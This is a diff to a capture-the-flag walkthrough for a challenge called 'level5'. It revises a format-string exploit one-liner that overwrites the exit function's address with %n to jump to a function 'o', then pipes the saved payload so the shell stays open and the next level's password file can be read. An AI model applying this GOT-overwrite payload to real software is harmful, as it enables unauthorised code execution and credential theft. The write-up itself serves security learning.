@@ -144,7 +144,8 @@ Non-debugging symbols:
 
 ## Building the exploit: 
 
-`python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n""' | ./level5`
+`python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n" > /tmp/attack5'`
+`cat /tmp/attack5 - | ./level5`
 
 - \x38\x98\x04\x08 represents the address of the exit function in little-endian format.
 - %134513824d specifies a large number of characters to print before %n is executed. 134513824 is the decimal representation of the little-endian address 0x080484a4, which is the address of the "o" function
@@ -153,4 +154,4 @@ Non-debugging symbols:
 
 
 ## Triggering System Call
-Once executed the exploit 134513824 chr are printed and then we can cat the /level6/.pass containing the flag
+Once executed the exploit 134513824 chr are printed, we have the prompt back and we can cat the /level6/.pass containing the flag
